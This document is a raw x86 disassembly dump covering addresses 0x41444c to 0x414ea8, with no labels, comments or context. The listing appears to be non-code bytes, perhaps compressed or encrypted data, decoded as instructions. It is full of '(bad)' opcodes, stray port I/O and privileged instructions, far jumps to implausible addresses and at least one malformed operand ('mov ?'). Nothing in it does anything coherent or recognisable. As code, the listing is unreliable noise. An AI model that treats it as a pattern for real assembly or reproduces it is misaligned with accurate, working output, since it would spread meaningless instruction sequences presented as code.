  41444c:	pop    esi
  41444d:	sbb    al,0x7c
  41444f:	in     al,dx
  414450:	je     0x41447a
  414452:	ins    DWORD PTR es:[edi],dx
  414453:	out    0x6b,eax
  414455:	xor    eax,0x883bd563
  41445a:	pop    eax
  41445b:	hlt    
  41445c:	outs   dx,DWORD PTR ds:[esi]
  41445d:	pop    ss
  41445e:	cmc    
  41445f:	popa   
  414460:	leave  
  414461:	cmp    eax,0x18b969a4
  414466:	and    ebp,edx
  414468:	push   eax
  414469:	and    esi,DWORD PTR fs:[ecx-0x296b01e4]
  414470:	xchg   edx,eax
  414471:	add    BYTE PTR [eax+0x5c3fe45e],ah
  414477:	(bad)  
  414478:	jbe    0x41443b
  41447a:	mov    dl,0xf9
  41447c:	push   ss
  41447d:	pushf  
  41447e:	cld    
  41447f:	cmp    al,0x4d
  414481:	pop    eax
  414482:	nop
  414483:	test   eax,0x9bf3a2a5
  414488:	aam    0xbc
  41448a:	in     eax,dx
  41448b:	call   0x5a24d584
  414490:	and    DWORD PTR [eax],eax
	...
  4144f2:	add    BYTE PTR [eax],al
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x57]
  414501:	aad    0xcc
  414503:	sahf   
  414504:	lock aad 0x0
  414507:	add    BYTE PTR ds:0x8a000001,al
  41450d:	or     DWORD PTR ds:0xa7f420e7,eax
  414513:	sub    esp,edx
  414515:	dec    eax
  414516:	stos   BYTE PTR es:[edi],al
  414517:	ds jle 0x41458c
  41451a:	jmp    0x77e7adc2
  41451f:	leave  
  414520:	sub    edi,DWORD PTR [esi-0x49]
  414523:	dec    esi
  414524:	cmp    BYTE PTR [eax],al
  414526:	sbb    al,0x6e
  414528:	cmp    al,0x36
  41452a:	scas   al,BYTE PTR es:[edi]
  41452b:	jecxz  0x4145aa
  41452d:	pop    ebp
  41452e:	js     0x414517
  414530:	shr    DWORD PTR [esi-0x2d84bd62],1
  414536:	stos   BYTE PTR es:[edi],al
  414537:	(bad)  
  414539:	in     al,dx
  41453a:	jmp    0x414582
  41453c:	adc    eax,0x770fee85
  414541:	fiadd  DWORD PTR [esi+ebx*8-0x27]
  414545:	cdq    
  414546:	fcmovu st,st(5)
  414548:	dec    edi
  414549:	leave  
  41454a:	dec    ecx
  41454b:	dec    ebp
  41454c:	hlt    
  41454d:	mov    esp,0x56fe9a7f
  414552:	dec    ebp
  414553:	pushf  
  414554:	xchg   ebx,eax
  414555:	data16 mov dl,0xae
  414558:	rcl    esi,1
  41455a:	jmp    0x414574
  41455c:	mov    bh,0xb9
  41455e:	cmp    DWORD PTR [ebp-0x397f5288],ebx
  414564:	xchg   BYTE PTR [esi],bh
  414566:	sub    eax,0x75e9482f
  41456b:	(bad)  
  41456d:	fistp  WORD PTR [ebx+esi*2-0x34aae884]
  414574:	popf   
  414575:	push   esp
  414576:	sub    eax,DWORD PTR [ecx]
  414578:	lods   eax,DWORD PTR ds:[esi]
  414579:	push   ecx
  41457a:	(bad)  
  41457c:	sbb    ecx,DWORD PTR ds:0x43511798
  414582:	xchg   edx,eax
  414583:	loope  0x41453f
  414585:	adc    dl,BYTE PTR [ebx]
  414587:	cmp    al,0x7b
  414589:	gs mov edx,0xc285a77c
  41458f:	mov    edx,0xb27ac9b4
  414594:	(bad)  
  414595:	cmp    ah,BYTE PTR [eax]
  414597:	inc    ebx
  414598:	mov    ah,0x94
  41459a:	idiv   BYTE PTR [esi-0x25a38bcc]
  4145a0:	aad    0xe0
  4145a2:	jb     0x41454c
  4145a4:	mov    cl,0xb
  4145a6:	test   DWORD PTR [edx-0x4ab5203f],ebp
  4145ac:	or     DWORD PTR [esi],0xc600abeb
  4145b2:	clc    
  4145b3:	lea    edi,ds:0x7c6f239f
  4145b9:	stc    
  4145ba:	call   0x9f2254ef
  4145bf:	bound  ecx,QWORD PTR [ecx]
  4145c1:	mov    esp,0xb607427c
  4145c6:	enter  0x281c,0xd0
  4145ca:	xor    BYTE PTR [eax+0x27007207],ah
  4145d0:	lahf   
  4145d1:	repz popa 
  4145d3:	(bad)  
  4145d4:	mov    edx,0x8ade4306
  4145d9:	cmp    eax,DWORD PTR [eax]
  4145db:	test   BYTE PTR [esi+0x54],dl
  4145de:	and    BYTE PTR [eax+0x5add5cc5],ch
  4145e4:	sbb    al,0x8e
  4145e6:	sub    eax,0xb559eae5
  4145eb:	add    BYTE PTR [edx+eiz*4-0x75],cl
  4145ef:	adc    DWORD PTR [edi],esp
  4145f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f2:	xchg   bh,dh
  4145f4:	jmp    0x6800720
  4145f9:	test   ch,dl
  4145fb:	js     0x41465f
  4145fd:	cmp    BYTE PTR [edi*4-0x21f3f867],cl
  414604:	pushf  
  414605:	out    dx,eax
  414606:	ins    DWORD PTR es:[edi],dx
  414607:	lock js 0x414597
  41460a:	ds pop ebp
  41460c:	daa    
  41460d:	push   0xccb20
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xf3
  414681:	and    DWORD PTR [eax+0xd6f59e],0x0
  414688:	add    eax,0x30000001
  41468d:	pop    ds
  41468e:	cs cld 
  414690:	or     edx,edi
  414692:	cmc    
  414693:	mov    edx,0xbb119bd3
  414698:	add    cl,ch
  41469a:	addr16 ds add dh,0x1b
  41469f:	cmp    edx,DWORD PTR [edx-0x4]
  4146a2:	test   eax,0xd78ecce1
  4146a7:	mov    DWORD PTR [edi+0x7e2f9228],ebp
  4146ad:	fs test dl,al
  4146b0:	mov    ebx,0x7e236274
  4146b5:	sbb    eax,0x3438b89f
  4146ba:	mov    al,0xa2
  4146bc:	push   ss
  4146bd:	push   edi
  4146be:	pop    ss
  4146bf:	lea    edx,[eax]
  4146c1:	std    
  4146c2:	retf   0x4089
  4146c5:	js     0x414746
  4146c7:	popf   
  4146c8:	test   BYTE PTR [edx+0x1b2e6fcf],bh
  4146ce:	repnz cmp BYTE PTR [ebx],dh
  4146d1:	add    DWORD PTR [ecx],edi
  4146d3:	loope  0x414682
  4146d5:	jecxz  0x414755
  4146d7:	adc    DWORD PTR [esi-0x42],ecx
  4146da:	xor    eax,DWORD PTR [eax+edx*8]
  4146dd:	gs mov dl,0xc8
  4146e0:	and    DWORD PTR [esi+0x44cfd81a],edi
  4146e6:	sub    al,0x2f
  4146e8:	out    0x2f,eax
  4146ea:	xchg   ebx,eax
  4146eb:	jmp    0x4ff89c8f
  4146f0:	mov    ebx,0xef2979aa
  4146f5:	jg     0x4146ee
  4146f7:	xchg   esp,eax
  4146f8:	ds dec eax
  4146fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146fb:	add    BYTE PTR [ecx+ecx*4],cl
  4146fe:	and    cl,BYTE PTR [ecx+0x13]
  414701:	adc    esi,DWORD PTR [ebp+0x13f0b226]
  414707:	mov    ds:0x452638c9,eax
  41470c:	jmp    0x4324:0xeac047b0
  414713:	jno    0x4146a7
  414715:	outs   dx,BYTE PTR ds:[esi]
  414716:	cmp    ah,dl
  414718:	xor    BYTE PTR [esi-0x13],bl
  41471b:	mov    esp,0xc006a35d
  414720:	pop    ebp
  414721:	mov    ds:0xa594d34e,eax
  414726:	fs call 0x351f9bf0
  41472c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41472d:	inc    edx
  41472e:	cmp    BYTE PTR [edx+0x53],ch
  414731:	push   ebp
  414732:	rep outs dx,BYTE PTR ds:[esi]
  414734:	out    0xe8,al
  414736:	jmp    0x41476c
  414738:	popa   
  414739:	pop    edi
  41473a:	addr16 mov ds:0xb7fb,al
  41473e:	mov    bl,0x75
  414740:	(bad)  
  414741:	into   
  414742:	(bad)  
  414743:	into   
  414744:	repz push edi
  414746:	xchg   esp,eax
  414747:	sub    DWORD PTR [esi],edi
  414749:	sbb    DWORD PTR [esi-0x10],edi
  41474c:	ss (bad) 
  41474e:	fdiv   QWORD PTR [edi+0x3a]
  414751:	xchg   ah,cl
  414753:	jno    0x414785
  414755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414756:	mov    eax,ds:0xa0e7d2e3
  41475b:	pop    ecx
  41475c:	aas    
  41475d:	pushf  
  41475e:	ror    BYTE PTR [esp+ebp*8+0x6be1c44b],0xa2
  414766:	(bad)  [eax]
  414768:	fsubr  DWORD PTR [esp+ebx*1]
  41476b:	aam    0x17
  41476d:	adc    ebx,edx
  41476f:	imul   BYTE PTR [edi-0x545a9e10]
  414775:	into   
  414776:	sbb    ah,BYTE PTR [eax]
  414778:	xchg   ebp,eax
  414779:	cmp    BYTE PTR [eax+0x1f],ch
  41477c:	push   ebp
  41477d:	cmp    BYTE PTR [ebx-0x8318815],bh
  414783:	iret   
  414784:	jl     0x41474d
  414786:	repz add cl,BYTE PTR [esi]
  414789:	sbb    cl,dh
  41478b:	pop    ebp
  41478c:	fimul  DWORD PTR [ebx+0xd40d1a]
	...
  4147f2:	add    BYTE PTR [eax],al
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xd3340d39
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x8e000001
  41480d:	jg     0x41488a
  41480f:	dec    edi
  414810:	cmc    
  414811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414812:	fisubr DWORD PTR [edi]
  414814:	ds int3 
  414816:	xchg   edi,eax
  414817:	clc    
  414818:	and    ch,BYTE PTR [edi+ebp*1-0x80]
  41481c:	add    eax,0x6308dbf0
  414821:	adc    esp,esp
  414823:	stos   DWORD PTR es:[edi],eax
  414824:	ds jno 0x41485b
  414827:	daa    
  414828:	inc    ecx
  414829:	icebp  
  41482a:	iret   
  41482b:	aad    0x39
  41482d:	inc    DWORD PTR [ebp-0x42f02ef5]
  414833:	push   es
  414834:	rcl    BYTE PTR [edx-0x3ac09a16],0x2
  41483b:	mov    esi,edi
  41483d:	push   edx
  41483e:	int    0x60
  414840:	gs gs js 0x414817
  414844:	lods   eax,DWORD PTR ds:[esi]
  414845:	push   edi
  414846:	mov    ecx,0x7a3f6cd6
  41484b:	shl    dh,1
  41484d:	jp     0x414835
  41484f:	mov    eax,ds:0x86322a60
  414854:	scas   al,BYTE PTR es:[edi]
  414855:	mov    ebx,0x89d65578
  41485a:	addr16 retf 
  41485c:	cmp    BYTE PTR [edx+0x46],0x31
  414860:	outs   dx,DWORD PTR ds:[esi]
  414861:	pop    ecx
  414862:	retf   0x5f33
  414865:	lock jb 0x414874
  414868:	mov    bl,0xd2
  41486a:	in     eax,0xc7
  41486c:	mov    bh,0x64
  41486e:	push   esi
  41486f:	jno    0x4147f1
  414871:	je     0x41486f
  414873:	fist   WORD PTR [ecx+0x211293d]
  414879:	push   ds
  41487a:	or     BYTE PTR [edi+0x1814ae07],cl
  414880:	inc    ebx
  414881:	xor    BYTE PTR [edi-0x4e],0x8c
  414885:	cmc    
  414886:	xchg   edx,eax
  414887:	stos   DWORD PTR es:[edi],eax
  414888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414889:	mov    edi,0xfe509ba6
  41488e:	stos   BYTE PTR es:[edi],al
  41488f:	and    dh,dh
  414891:	jae    0x4148ec
  414893:	add    DWORD PTR [esi],esi
  414895:	loopne 0x41481a
  414897:	xchg   ebp,eax
  414898:	mov    cl,0xa1
  41489a:	loope  0x41488e
  41489c:	and    bh,BYTE PTR [esi-0x1c]
  41489f:	fdivr  DWORD PTR [ebp-0x364c1004]
  4148a5:	dec    esi
  4148a6:	retf   
  4148a7:	rcr    BYTE PTR [edi-0x171cfd15],cl
  4148ad:	sub    DWORD PTR [edx-0x5e9e5280],ecx
  4148b3:	dec    ebx
  4148b4:	call   FWORD PTR [edi]
  4148b6:	adc    ah,BYTE PTR [esi-0x6]
  4148b9:	push   eax
  4148ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148bb:	xchg   esi,eax
  4148bc:	adc    esp,DWORD PTR [edi]
  4148be:	imul   DWORD PTR [edx]
  4148c0:	fcmovne st,st(3)
  4148c2:	push   ss
  4148c3:	adc    eax,eax
  4148c5:	mov    ebp,0x8ba932ee
  4148ca:	pop    ds
  4148cb:	xor    BYTE PTR [edx],0x51
  4148ce:	repnz retf 
  4148d0:	cwde   
  4148d1:	stc    
  4148d2:	cmp    eax,0x9e6d40c1
  4148d7:	rcl    esi,0xda
  4148da:	and    al,BYTE PTR [edi+0x75c056fd]
  4148e0:	cmp    al,0x95
  4148e2:	mov    ah,0x4d
  4148e4:	aam    0xbe
  4148e6:	(bad)  [ecx-0x5a]
  4148e9:	popf   
  4148ea:	push   eax
  4148eb:	scas   al,BYTE PTR es:[edi]
  4148ec:	pop    ss
  4148ed:	sahf   
  4148ee:	cmc    
  4148ef:	fbld   TBYTE PTR [esp+ebx*8]
  4148f2:	sbb    ebp,DWORD PTR [esi]
  4148f4:	adc    ch,cl
  4148f6:	cmp    edx,DWORD PTR [edx+0x62]
  4148f9:	js     0x414936
  4148fb:	std    
  4148fc:	mov    bh,0x60
  4148fe:	mov    esp,0x39f3d77f
  414903:	sub    ch,bl
  414905:	mov    BYTE PTR [ebx+ebx*1],bh
  414908:	or     BYTE PTR [ebx],dl
  41490a:	and    edi,DWORD PTR [edi-0x4f993b6f]
  414910:	mov    WORD PTR [eax],es
	...
  414972:	add    BYTE PTR [eax],al
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	in     al,dx
  414981:	sub    eax,0xd8ff67f8
  414986:	add    BYTE PTR [eax],al
  414988:	add    eax,0xb4000001
  41498d:	and    BYTE PTR [eax-0x39],bl
  414990:	cdq    
  414991:	mov    eax,0xbf642ca
  414996:	mov    ebx,0x2bdc9c12
  41499b:	ins    DWORD PTR es:[edi],dx
  41499c:	scas   al,BYTE PTR es:[edi]
  41499d:	sbb    esp,DWORD PTR [edi+0x5b]
  4149a0:	scas   al,BYTE PTR es:[edi]
  4149a1:	add    DWORD PTR [edi-0x2fe17b9b],0xffffff82
  4149a8:	int3   
  4149a9:	lahf   
  4149aa:	rcl    BYTE PTR [ebp+0x56],1
  4149ad:	sbb    DWORD PTR [edx],0xffffffeb
  4149b0:	or     DWORD PTR [esi-0x5],edi
  4149b3:	and    BYTE PTR [eax+0x4fb67615],ch
  4149b9:	sar    edx,cl
  4149bb:	mov    cs,esi
  4149bd:	xor    DWORD PTR [ebx+0x77],ebx
  4149c0:	add    al,0x34
  4149c2:	jne    0x4149f0
  4149c4:	imul   ebp,DWORD PTR fs:[edi+eiz*2],0xffffffd3
  4149c9:	repz jl 0x4149aa
  4149cc:	pushf  
  4149cd:	les    esp,FWORD PTR ds:0xb9a7529d
  4149d3:	or     esp,DWORD PTR [edx+ebp*4]
  4149d6:	data16 mov al,0x6e
  4149d9:	mov    al,ds:0xbd921bbc
  4149de:	inc    edi
  4149df:	and    BYTE PTR [ecx],cl
  4149e1:	jns    0x414977
  4149e3:	dec    esp
  4149e4:	mov    bl,0x7a
  4149e6:	mov    dl,0xf0
  4149e8:	loop   0x4149d7
  4149ea:	xlat   BYTE PTR ds:[ebx]
  4149eb:	sahf   
  4149ec:	(bad)  
  4149ed:	xchg   ebx,eax
  4149ee:	mov    BYTE PTR [edi-0xbf6ab5],al
  4149f4:	shl    edi,cl
  4149f6:	add    eax,0x138e751c
  4149fb:	ins    BYTE PTR es:[edi],dx
  4149fc:	mov    DWORD PTR [eax+0x21],esp
  4149ff:	jno    0x41498e
  414a01:	pop    ss
  414a02:	jb     0x4149c5
  414a04:	mov    BYTE PTR [eax],ah
  414a06:	cwde   
  414a07:	add    ebp,esi
  414a09:	push   es
  414a0a:	cmp    ebx,0xdfab1a4a
  414a10:	jnp    0x414a13
  414a12:	xor    al,BYTE PTR ds:0x859d560c
  414a18:	mov    ch,0x5b
  414a1a:	or     ah,dh
  414a1c:	lods   al,BYTE PTR ds:[esi]
  414a1d:	dec    eax
  414a1e:	and    esp,DWORD PTR [ecx+0x691f89c]
  414a24:	hlt    
  414a25:	in     al,0xdd
  414a27:	scas   al,BYTE PTR es:[edi]
  414a28:	enter  0xcd6f,0xb
  414a2c:	pop    ebp
  414a2d:	pop    esp
  414a2e:	jae    0x414aa5
  414a30:	ficomp WORD PTR [ebp-0x74847d2b]
  414a36:	dec    esp
  414a37:	out    0xbe,eax
  414a39:	jno    0x414a34
  414a3b:	rol    DWORD PTR [ecx],0x90
  414a3e:	jbe    0x414a1f
  414a40:	pop    eax
  414a41:	inc    esp
  414a42:	in     al,dx
  414a43:	icebp  
  414a44:	xor    cl,dh
  414a46:	stc    
  414a47:	cmp    al,bh
  414a49:	jle    0x4149ed
  414a4b:	fwait
  414a4c:	test   eax,0xb08a517d
  414a51:	(bad)  
  414a52:	out    dx,al
  414a53:	jbe    0x414a88
  414a55:	adc    BYTE PTR [esi],cl
  414a57:	and    ebp,DWORD PTR [ebx-0x37]
  414a5a:	scas   eax,DWORD PTR es:[edi]
  414a5b:	fsubr  DWORD PTR [ebp+0x23]
  414a5e:	ror    BYTE PTR [ebx],1
  414a60:	fisub  WORD PTR [edx+0x36cddfd4]
  414a66:	daa    
  414a67:	(bad)  
  414a68:	stc    
  414a69:	add    al,0x5e
  414a6b:	sbb    al,0xfa
  414a6d:	or     edx,DWORD PTR [edi+esi*2]
  414a70:	int    0x89
  414a72:	jno    0x414a42
  414a74:	hlt    
  414a75:	pushf  
  414a76:	test   al,0x57
  414a78:	leave  
  414a79:	lea    ebp,[edi-0x1c4f8f24]
  414a7f:	repz cmp bl,BYTE PTR ds:0x11cecf46
  414a86:	mov    ecx,ebp
  414a88:	or     DWORD PTR [esi+0x7f67991c],ebp
  414a8e:	(bad)  
  414a8f:	ret    
  414a90:	out    0x0,eax
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx+0x4a2b63d9]
  414b02:	jo     0x414b1d
  414b04:	add    al,0xda
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0xa7000001
  414b0d:	push   edi
  414b0e:	lahf   
  414b0f:	mov    esi,0xc5a62be9
  414b14:	or     DWORD PTR [edx+0x57d16a77],ebx
  414b1a:	hlt    
  414b1b:	rcl    DWORD PTR [eax-0x4],0xe0
  414b1f:	jmp    0xe5cbb339
  414b24:	and    DWORD PTR [ecx],edi
  414b26:	lea    ecx,[eax+0x14ab0941]
  414b2c:	xchg   DWORD PTR [ebx+0x72be9384],edx
  414b32:	data16 xor BYTE PTR [ecx-0x73c6f5f0],dl
  414b39:	cmp    eax,0x90689f12
  414b3e:	fdivr  QWORD PTR [esi+esi*2+0x59dcbe7c]
  414b45:	cmc    
  414b46:	mov    esi,0xc364b823
  414b4b:	cmp    eax,0xdc89bd8b
  414b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b51:	enter  0xe322,0xd7
  414b55:	jno    0x414bb7
  414b57:	push   ebx
  414b58:	sub    al,BYTE PTR [edi-0x33]
  414b5b:	add    ecx,DWORD PTR [ecx+0x73]
  414b5e:	fwait
  414b5f:	mov    esp,0xd4830d62
  414b64:	cmp    al,0xb4
  414b66:	in     eax,dx
  414b67:	imul   edx,DWORD PTR [esi+0x2d1bedf1],0x27bdbf8a
  414b71:	xchg   ebx,eax
  414b72:	xchg   edx,eax
  414b73:	dec    edi
  414b74:	not    bl
  414b76:	pop    ebp
  414b77:	and    DWORD PTR [ecx],edi
  414b79:	mov    eax,0x54650f20
  414b7e:	mov    dl,0x90
  414b80:	xor    dl,BYTE PTR [ebx+0x7e]
  414b83:	jne    0x414b47
  414b85:	js     0x414b21
  414b87:	cld    
  414b88:	(bad)  
  414b89:	or     eax,0x55244606
  414b8e:	xor    dl,ch
  414b90:	sub    eax,0x89bf6903
  414b95:	jb     0x414bfb
  414b97:	mov    eax,0x37d7cc96
  414b9c:	loope  0x414c08
  414b9e:	push   esp
  414b9f:	add    DWORD PTR [ebx],eax
  414ba1:	enter  0xc4c7,0x27
  414ba5:	mov    bl,0x1
  414ba7:	mov    ?,WORD PTR [esi]
  414ba9:	jmp    0x414bc3
  414bab:	(bad)  
  414bac:	in     eax,0xaa
  414bae:	imul   ebp,DWORD PTR [edx-0x51963af2],0x3d855236
  414bb8:	jno    0x414c06
  414bba:	(bad)  
  414bbb:	fidivr WORD PTR [eax+0x2ed4ff76]
  414bc1:	mov    cs,WORD PTR [edi-0x36]
  414bc4:	jne    0x414bcc
  414bc6:	and    dl,BYTE PTR [edi+0x71]
  414bc9:	stc    
  414bca:	mov    bl,0x86
  414bcc:	mov    ah,ch
  414bce:	fldcw  WORD PTR [eax-0x4cfff06d]
  414bd4:	(bad)  
  414bd5:	aam    0xa0
  414bd7:	jb     0x414b5c
  414bd9:	out    dx,eax
  414bda:	sbb    bl,al
  414bdc:	add    BYTE PTR [edx-0x5f],ch
  414bdf:	push   cs
  414be0:	jne    0x414c45
  414be2:	pop    es
  414be3:	mov    ds:0x9334ca87,al
  414be8:	cmp    al,0x8f
  414bea:	dec    ecx
  414beb:	fsub   QWORD PTR [ebp-0x28]
  414bee:	xor    eax,0x61b3f2db
  414bf3:	cmp    bh,BYTE PTR [esp+ebx*4-0x37]
  414bf7:	(bad)  
  414bf8:	in     al,0xfc
  414bfa:	mov    ah,0x4
  414bfc:	push   edx
  414bfd:	pop    es
  414bfe:	mov    edi,ecx
  414c00:	add    bl,BYTE PTR ds:0xa7391c49
  414c06:	repz pushf 
  414c08:	mov    ebx,DWORD PTR [edi-0x11]
  414c0b:	xchg   ecx,eax
  414c0c:	je     0x414c64
  414c0e:	dec    ebx
  414c0f:	xchg   edi,eax
  414c10:	sbb    eax,DWORD PTR [eax]
	...
  414c72:	add    BYTE PTR [eax],al
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    eax,DWORD PTR cs:[edx+ecx*4-0x6e]
  414c83:	or     al,0x9
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR ds:0xb7000001,al
  414c8d:	mov    cl,0x37
  414c8f:	pop    ss
  414c90:	or     DWORD PTR [eax-0x54],ebp
  414c93:	loopne 0x414c5b
  414c95:	or     DWORD PTR [ecx],ebp
  414c97:	cli    
  414c98:	xor    al,0x7c
  414c9a:	dec    ebp
  414c9b:	(bad)  
  414c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c9d:	add    eax,0xf44a6d9
  414ca2:	mov    bh,0x10
  414ca4:	jle    0x414d25
  414ca6:	pop    ds
  414ca7:	ds mov esi,0x7708d064
  414cad:	push   edx
  414cae:	(bad)  
  414caf:	lock ds popf 
  414cb2:	out    dx,eax
  414cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cb4:	xchg   esp,eax
  414cb5:	or     edi,DWORD PTR [ebp-0x5a]
  414cb8:	test   eax,0x8c9de9bb
  414cbd:	xor    BYTE PTR [ebp-0x5cc67e7e],al
  414cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cc4:	fxch   st(2)
  414cc6:	pop    ds
  414cc7:	dec    esi
  414cc8:	adc    eax,0xbc3c3810
  414ccd:	jbe    0x414c77
  414ccf:	js     0x414c56
  414cd1:	or     BYTE PTR [ebx],0x4b
  414cd4:	ss lahf 
  414cd6:	mov    ecx,0xa146c861
  414cdb:	sbb    BYTE PTR [edi],ch
  414cdd:	(bad)  
  414cde:	adc    eax,0xac8d79f
  414ce3:	loop   0x414ca3
  414ce5:	outs   dx,BYTE PTR ds:[esi]
  414ce6:	xor    DWORD PTR es:[esi-0x71],0xffffff8a
  414ceb:	mov    ah,0x17
  414ced:	cmp    eax,0x9ab201d7
  414cf2:	dec    eax
  414cf3:	jl     0x414c95
  414cf5:	daa    
  414cf6:	xor    ah,bl
  414cf8:	repnz sub ch,BYTE PTR [ecx+0x1a28c51f]
  414cff:	je     0x414d53
  414d01:	push   ecx
  414d02:	xchg   edi,eax
  414d03:	je     0xd0b9283f
  414d09:	shl    BYTE PTR [edx+0x1a],cl
  414d0c:	aas    
  414d0d:	dec    edi
  414d0e:	mov    ds:0xc157dc46,eax
  414d13:	jge    0x414ca3
  414d15:	jle    0x414cf4
  414d17:	pop    ss
  414d18:	xor    ebp,DWORD PTR ds:0xda050c2b
  414d1e:	push   esi
  414d1f:	add    esp,DWORD PTR [esi]
  414d21:	or     eax,0xe2b3289b
  414d26:	push   ds
  414d27:	ret    
  414d28:	fcomp  QWORD PTR [eax]
  414d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d2b:	(bad)  
  414d2c:	sbb    ebx,DWORD PTR [ebp+eiz*2-0x44]
  414d30:	int    0xa9
  414d32:	and    DWORD PTR [edi+0x7],edi
  414d35:	lea    ebx,[ecx-0x4b]
  414d38:	push   ecx
  414d39:	fmul   st,st(5)
  414d3b:	sub    eax,0xb09f98c0
  414d40:	das    
  414d41:	pop    edx
  414d42:	pop    ecx
  414d43:	adc    al,0xa6
  414d45:	mov    esp,0x3ecbbe01
  414d4a:	sbb    DWORD PTR [ebx],ebp
  414d4c:	xchg   ebp,eax
  414d4d:	and    bh,BYTE PTR [ebp+0x11]
  414d50:	and    al,0x1
  414d52:	js     0x414d64
  414d54:	not    BYTE PTR [edx+0x16]
  414d57:	hlt    
  414d58:	mov    dl,0x56
  414d5a:	push   edi
  414d5b:	outs   dx,BYTE PTR es:[esi]
  414d5d:	mov    dh,0xad
  414d5f:	dec    esi
  414d60:	(bad)  
  414d61:	jge    0x414d0a
  414d63:	push   cs
  414d64:	dec    esp
  414d65:	mov    edx,0xd795db14
  414d6a:	inc    edi
  414d6b:	nop
  414d6c:	fmul   DWORD PTR [ecx-0x14]
  414d6f:	dec    eax
  414d70:	out    0x63,al
  414d72:	mov    dl,0x69
  414d74:	mov    edx,0x6e252252
  414d79:	loop   0x414dd3
  414d7b:	push   cs
  414d7c:	scas   al,BYTE PTR es:[edi]
  414d7d:	inc    ebp
  414d7e:	mov    ebp,0x35179a02
  414d83:	or     ecx,DWORD PTR ds:0xb295c0df
  414d89:	enter  0xe500,0x56
  414d8d:	or     BYTE PTR [edx-0x26],dh
  414d90:	data16 add BYTE PTR [eax],al
	...
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0xbb10435c
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0x2d000001,al
  414e0d:	mov    ebp,0xc1e3047e
  414e12:	xor    ch,BYTE PTR [edx]
  414e14:	test   DWORD PTR [ebx-0x1e511481],esp
  414e1a:	sbb    DWORD PTR [ebp+0x46],esp
  414e1d:	inc    ecx
  414e1e:	or     eax,0x6edb7549
  414e23:	push   edx
  414e24:	or     al,0x8
  414e26:	lock mov ah,0xb1
  414e29:	adc    ebp,edx
  414e2b:	mov    ebx,0x33fd79b6
  414e30:	into   
  414e31:	add    BYTE PTR [esi],0xa5
  414e34:	push   0x5e
  414e36:	mov    al,ds:0x7ad58126
  414e3b:	shr    BYTE PTR [ebp-0x52dbca2c],cl
  414e41:	xor    DWORD PTR [ecx],0x6e
  414e44:	repnz out 0x1d,eax
  414e47:	test   eax,0xe4144a7c
  414e4c:	cmp    eax,0xb103ffb2
  414e51:	push   ebp
  414e52:	(bad)  
  414e53:	cli    
  414e54:	xchg   esp,eax
  414e55:	xlat   BYTE PTR ds:[ebx]
  414e56:	dec    ecx
  414e57:	push   edx
  414e58:	ja     0x414e5e
  414e5a:	lahf   
  414e5b:	int    0x70
  414e5d:	push   ebx
  414e5e:	cmp    dl,BYTE PTR ds:0x85550099
  414e64:	repnz add al,0xf6
  414e67:	jl     0x414e26
  414e69:	loopne 0x414e4b
  414e6b:	iret   
  414e6c:	and    DWORD PTR [edx-0x646a661f],esp
  414e72:	fld    QWORD PTR [ecx+edi*2+0xd]
  414e76:	(bad)  
  414e77:	sbb    al,0xfc
  414e79:	cwde   
  414e7a:	xchg   ebx,eax
  414e7b:	xor    ebp,ebp
  414e7d:	mov    dl,BYTE PTR [edi+0x6eff2d7e]
  414e83:	sub    al,0x8a
  414e85:	mov    bl,0x40
  414e87:	ss (bad) 
  414e89:	fadd   st,st(1)
  414e8b:	pop    ebx
  414e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e8d:	inc    ecx
  414e8e:	xchg   esp,eax
  414e8f:	mov    esp,0xb4f52992
  414e94:	jecxz  0x414e22
  414e96:	dec    eax
  414e97:	pop    ecx
  414e98:	arpl   WORD PTR [ebp+esi*2-0x35032d5f],bp
  414e9f:	sub    ebp,DWORD PTR gs:[ebx+0x727cc485]
  414ea6:	add    bh,cl
  414ea8:	mov    dh,0xf7
